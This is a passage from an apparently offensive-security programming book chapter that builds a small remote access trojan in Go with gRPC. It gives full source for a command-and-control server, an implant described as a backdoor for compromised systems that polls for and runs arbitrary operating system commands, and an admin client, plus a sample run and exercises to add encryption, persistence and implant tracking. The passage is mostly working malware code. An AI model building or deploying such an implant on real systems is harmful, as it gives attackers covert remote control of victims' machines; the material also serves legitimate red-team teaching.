}
return cmd, errors.New("channel closed")
default:
// No work
return cmd, nil
}
}
❺ func (s *implantServer) SendOutput(ctx context.Context, \
result *grpcapi.Command)
(*grpcapi.Empty, error) {
s.output <- result
return &grpcapi.Empty{}, nil
}
❻ func (s *adminServer) RunCommand(ctx context.Context, cmd
*grpcapi.Command) \
(*grpcapi.Command, error) {
var res *grpcapi.Command
go func() {
s.work <- cmd
}()
res = <-s.output
return res, nil
}
Listing 14-2: Defining the server types (/ch-14/server/server.go)
To serve our admin and implant APIs, we need to define
server types that implement all the necessary interface
methods. This is the only way we can start an Implant or Admin
service. That is, we’ll need to have the FetchCommand(ctx
context.Context, empty *grpcapi.Empty), SendOutput(ctx context .Context, result
*grpcapi.Command), and RunCommand(ctx context.Context, cmd
*grpcapi.Command) methods properly defined. To keep our
implant and admin APIs mutually exclusive, we’ll implement
them as separate types.
First, we create our structs, named implantServer and adminServer,
that’ll implement the necessary methods ❶. Each type
contains identical fields: two channels, used for sending and
receiving work and command output. This is a pretty simple
way for our servers to proxy the commands and their
responses between the admin and implant components.
Next, we define a couple of helper functions,
NewImplantServer(work, output chan *grpcapi.Command) and
NewAdminServer(work, output chan *grpcapi.Command), that create new
implantServer and adminServer instances ❷. These exist solely to
make sure the channels are properly initialized.
Now comes the interesting part: the implementation of our
gRPC methods. You might notice that the methods don’t
exactly match the Protobuf schema. For example, we’re
receiving a context.Context parameter in each method and
returning an error. The protoc command you ran earlier to
compile your schema added these to each interface method
definition in the generated file. This lets us manage request
context and return errors. This is pretty standard stuff for most
network communications. The compiler spared us from having
to explicitly require that in our schema file.
The first method we implement on our implantServer,
FetchCommand(ctx context.Context, empty *grpcapi.Empty), receives a
*grpcapi.Empty and returns a *grpcapi.Command ❸. Recall that we
defined this Empty type because gRPC doesn’t allow null values
explicitly. We don’t need to receive any input since the client
implant will call the FetchCommand(ctx context.Context, empty *grpcapi
.Empty) method as sort of a polling mechanism that asks, “Hey,
do you have work for me?” The method’s logic is a bit more
complicated, since we can send work to the implant only if we
actually have work to send. So, we use a select statement ❹ on
the work channel to determine whether we do have work.
Reading from a channel in this manner is nonblocking,
meaning that execution will run our default case if there’s
nothing to read from the channel. This is ideal, since we’ll
have our implant calling FetchCommand(ctx context.Context, empty
*grpcapi.Empty) on a periodic basis as a way to get work on a
near-real-time schedule. In the event that we do have work in
the channel, we return the command. Behind the scenes, the
command will be serialized and sent over the network back to
the implant.
The second implantServer method, SendOutput(ctx context.Context,
result *grpcapi.Command), pushes the received *grpcapi.Command onto
the output channel ❺. Recall that we defined our Command to
have not only a string field for the command to run, but also a
field to hold the command’s output. Since the Command we’re
receiving has the output field populated with the result of a
command (as run by the implant) the SendOutput(ctx context.Context,
result *grpcapi.Command) method simply takes that result from the
implant and puts it onto a channel that our admin component
will read from later.
The last implantServer method, RunCommand(ctx context.Context, cmd
*grpcapi.Command), is defined on the adminServer type. It receives a
Command that has not yet been sent to the implant ❻. It
represents a unit of work our admin component wants our
implant to execute. We use a goroutine to place our work on
the work channel. As we’re using an unbuffered channel, this
action blocks execution. We need to be able to read from the
output channel, though, so we use a goroutine to put work on
the channel and continue execution. Execution blocks, waiting
for a response on our output channel. We’ve essentially made
this flow a synchronous set of steps: send a command to an
implant and wait for a response. When we receive the
response, we return the result. Again, we expect this result, a
Command, to have its output field populated with the result of
the operating system command executed by the implant.
Writing the main() Function
Listing 14-3 shows the server/server.go file’s main() function,
which runs two separate servers—one to receive commands
from the admin client and the other to receive polling from the
implant. We have two listeners so that we can restrict access to
our admin API—we don’t want just anyone interacting with it
—and we want to have our implant listen on a port that you
can access from restrictive networks.
func main() {
❶ var (
implantListener, adminListener net.Listener
err error
opts []grpc.ServerOption
work, output chan *grpcapi.Command
)
❷ work, output = make(chan *grpcapi.Command), make(chan
*grpcapi.Command)
❸ implant := NewImplantServer(work, output)
admin := NewAdminServer(work, output)
❹ if implantListener, err = net.Listen("tcp", \
fmt.Sprintf("localhost:%d", 4444)); err != nil {
log.Fatal(err)
}
if adminListener, err = net.Listen("tcp", \
fmt.Sprintf("localhost:%d", 9090)); err != nil {
log.Fatal(err)
}
❺ grpcAdminServer, grpcImplantServer := \
grpc.NewServer(opts...), grpc.NewServer(opts...)
❻ grpcapi.RegisterImplantServer(grpcImplantServer, implant)
grpcapi.RegisterAdminServer(grpcAdminServer, admin)
❼ go func() {
grpcImplantServer.Serve(implantListener)
}()
❽ grpcAdminServer.Serve(adminListener)
}
Listing 14-3: Running admin and implant servers (/ch-14/server/server.go)
First, we declare variables ❶. We use two listeners: one for
the implant server and one for the admin server. We’re doing
this so that we can serve our admin API on a port separate
from our implant API.
We create the channels we’ll use for passing messages
between the implant and admin services ❷. Notice that we use
the same channels for initializing both the implant and admin
servers via calls to NewImplantServer(work, output) and
NewAdminServer(work, output) ❸. By using the same channel
instances, we’re letting our admin and implant servers talk to
each other over this shared channel.
Next, we initiate our network listeners for each server,
binding our implantListener to port 4444 and our adminListener to
port 9090 ❹. We’d generally use port 80 or 443, which are
HTTP/s ports that are commonly allowed to egress networks,
but in this example, we just picked an arbitrary port for testing
purposes and to avoid interfering with other services running
on our development machines.
We have our network-level listeners defined. Now we set
up our gRPC server and API. We create two gRPC server
instances (one for our admin API and one for our implant API)
by calling grpc.NewServer() ❺. This initializes the core gRPC
server that will handle all the network communications and
such for us. We just need to tell it to use our API. We do this
by registering instances of API implementations (named implant
and admin in our example) by calling
grpcapi.RegisterImplantServer(grpcImplantServer, implant) ❻ and
grpcapi.RegisterAdminServer(grpcAdminServer, admin). Notice that,
although we have a package we created named grpcapi, we
never defined these two functions; the protoc command did. It
created these functions for us in implant.pb.go as a means to
create new instances of our implant and admin gRPC API
servers. Pretty slick!
At this point, we’ve defined the implementations of our
API and registered them as gRPC services. The last thing we
do is start our implant server by calling
grpcImplantServer.Serve(implantListener) ❼. We do this from within a
goroutine to prevent the code from blocking. After all, we
want to also start our admin server, which we do via a call to
❽.
grpcAdminServer.Serve(adminListener)
Your server is now complete, and you can start it by
running go run server/server.go. Of course, nothing is interacting
with your server, so nothing will happen yet. Let’s move on to
the next component—our implant.
CREATING THE CLIENT IMPLANT
The client implant is designed to run on compromised
systems. It will act as a backdoor through which we can run
operating system commands. In this example, the implant will
periodically poll the server, asking for work. If there is no
work to be done, nothing happens. Otherwise, the implant
executes the operating system command and sends the output
back to the server.
Listing 14-4 shows the contents of implant/implant.go.
func main() {
var
(
opts []grpc.DialOption
conn *grpc.ClientConn
err error
client grpcapi.ImplantClient ❶
)
opts = append(opts, grpc.WithInsecure())
if conn, err = grpc.Dial(fmt.Sprintf("localhost:%d", 4444), opts...); err != nil {
❷
log.Fatal(err)
}
defer conn.Close()
client = grpcapi.NewImplantClient(conn) ❸
ctx := context.Background()
for { ❹
var req = new(grpcapi.Empty)
cmd, err := client.FetchCommand(ctx, req) ❺
if err != nil {
log.Fatal(err)
}
if cmd.In == "" {
// No work
time.Sleep(3*time.Second)
continue
}
tokens := strings.Split(cmd.In, " ") ❻
var c *exec.Cmd
if len(tokens) == 1 {
c = exec.Command(tokens[0])
} else {
c = exec.Command(tokens[0], tokens[1:]...)
}
buf, err := c.CombinedOutput()❼
if err != nil {
cmd.Out = err.Error()
}
cmd.Out += string(buf)
client.SendOutput(ctx, cmd) ❽
}
}
Listing 14-4: Creating the implant (/ch-14/implant/implant.go)
The implant code contains a main() function only. We start
by declaring our variables, including one of the
grpcapi.ImplantClient type ❶. The protoc command automatically
created this type for us. The type has all the required RPC
function stubs necessary to facilitate remote communications.
We then establish a connection, via grpc.Dial(target string,
opts... DialOption), to the implant server running on port 4444
❷. We’ll use this connection for the call to
grpcapi.NewImplantClient(conn) ❸ (a function that protoc created for
us). We now have our gRPC client, which should have an
established connection back to our implant server.
Our code proceeds to use an infinite for loop ❹ to poll the
implant server, repeatedly checking to see if there’s work that
needs to be performed. It does this by issuing a call to
client.FetchCommand(ctx, req), passing it a request context and Empty
struct ❺. Behind the scenes, it’s connecting to our API server.
If the response we receive doesn’t have anything in the cmd.In
field, we pause for 3 seconds and then try again. When a unit
of work is received, the implant splits the command into
individual words and arguments by calling strings.Split(cmd.In, " ")
❻. This is necessary because Go’s syntax for executing
operating system commands is exec.Command(name, args...),
where name is the command to be run and args... is a list of
any subcommands, flags, and arguments used by that
operating system command. Go does this to prevent operating
system command injection, but it complicates our execution,
because we have to split up the command into relevant pieces
before we can run it. We run the command and gather output
by running c.CombinedOutput() ❼. Lastly, we take that output and
initiate a gRPC call to client.SendOutput(ctx, cmd) to send our
command and its output back to the server ❽.
Your implant is complete, and you can run it via go run
implant/implant.go. It should connect to your server. Again, it’ll be
anticlimactic, as there’s no work to be performed. Just a
couple of running processes, making a connection but doing
nothing meaningful. Let’s fix that.
BUILDING THE ADMIN
COMPONENT
The admin component is the final piece to our RAT. It’s where
we’ll actually produce work. The work will get sent, via our
admin gRPC API, to the server, which then forwards it on to
the implant. The server gets the output from the implant and
sends it back to the admin client. Listing 14-5 shows the code
in client/client.go.
func main() {
var
(
opts []grpc.DialOption
conn *grpc.ClientConn
err error
client grpcapi.AdminClient ❶
)
opts = append(opts, grpc.WithInsecure())
if conn, err = grpc.Dial(fmt.Sprintf("localhost:%d", 9090), opts...); err != nil {
❷
log.Fatal(err)
}
defer conn.Close()
client = grpcapi.NewAdminClient(conn) ❸
var cmd = new(grpcapi.Command)
cmd.In = os.Args[1] ❹
ctx := context.Background()
cmd, err = client.RunCommand(ctx, cmd) ❺
if err != nil {
log.Fatal(err)
}
fmt.Println(cmd.Out) ❻
}
Listing 14-5: Creating the admin client (/ch-14/client/client.go)
We start by defining our grpcapi.AdminClient variable ❶,
establishing a connection to our administrative server on port
9090 ❷, and using the connection in a call to
grpcapi.NewAdminClient(conn) ❸, creating an instance of our admin
gRPC client. (Remember that the grpcapi.AdminClient type and
grpcapi.NewAdminClient() function were created for us by protoc.)
Before we proceed, compare this client creation process with
that of the implant code. Notice the similarities, but also the
subtle differences in types, function calls, and ports.
Assuming there is a command line argument, we read the
operating system command from it ❹. Of course, the code
would be more robust if we checked whether an argument was
passed in, but we’re not worried about it for this example. We
assign that command string to the cmd.In. We pass this cmd, a
*grpcapi.Command instance, to our gRPC client’s RunCommand(ctx
context.Context, cmd *grpcapi.Command) method ❺. Behind the
scenes, this command gets serialized and sent to the admin
server we created earlier. After the response is received, we
expect the output to populate with the operating system
command results. We write that output to the console ❻.
RUNNING THE RAT
Now, assuming you have both the server and the implant
running, you can execute your admin client via go run
client/client.go command. You should receive the output in your
admin client terminal and have it displayed to the screen, like
this:
$ go run client/client.go 'cat /etc/resolv.conf'
domain Home
nameserver 192.168.0.1
nameserver 205.171.3.25
There it is—a working RAT. The output shows the
contents of a remote file. Run some other commands to see
your implant in action.
IMPROVING THE RAT
As we mentioned at the beginning of this chapter, we
purposely kept this RAT small and feature-bare. It won’t scale
well. It doesn’t gracefully handle errors or connection
disruptions, and it lacks a lot of basic features that allow you
to evade detection, move across networks, escalate privileges,
and more.
Rather than making all these improvements in our example,
we instead lay out a series of enhancements that you can make
on your own. We’ll discuss some of the considerations but will
leave each as an exercise for you. To complete these exercises,
you’ll likely need to refer to other chapters of this book, dig
deeper into Go package documentation, and experiment with
using channels and concurrency. It’s an opportunity to put
your knowledge and skills to a practical test. Go forth and
make us proud, young Padawan.
Encrypt Your Communications
All C2 utilities should encrypt their network traffic! This is
especially important for communications between the implant
and the server, as you should expect to find egress network
monitoring in any modern enterprise environment.
Modify your implant to use TLS for these communications.
This will require you to set additional values for the
[]grpc.DialOptions slice on the client as well as on the server.
While you’re at it, you should probably alter your code so that
services are bound to a defined interface, and listen and
connect to localhost by default. This will prevent unauthorized
access.
A consideration you’ll have to make, particularly if you’ll
be performing mutual certificate-based authentication, is how
to administer and manage the certificates and keys in the
implant. Should you hardcode them? Store them remotely?
Derive them at runtime with some magic voodoo that
determines whether your implant is authorized to connect to
your server?
Handle Connection Disruptions
While we’re on the topic of communications, what happens if
your implant can’t connect to your server or if your server dies
with a running implant? You may have noticed that it breaks
everything—the implant dies. If the implant dies, well, you’ve
lost access to that system. This can be a pretty big deal,
particularly if the initial compromise happened in a manner
that’s hard to reproduce.
Fix this problem. Add some resilience to your implant so
that it doesn’t immediately die if a connection is lost. This will
likely involve replacing calls to log.Fatal(err) in your implant.go
file with logic that calls grpc.Dial(target string, opts
...DialOption) again.
Register the Implants
You’ll want to be able to track your implants. At present, our
admin client sends a command expecting only a single implant
to exist. There is no means of tracking or registering an
implant, let alone any means of sending a command to a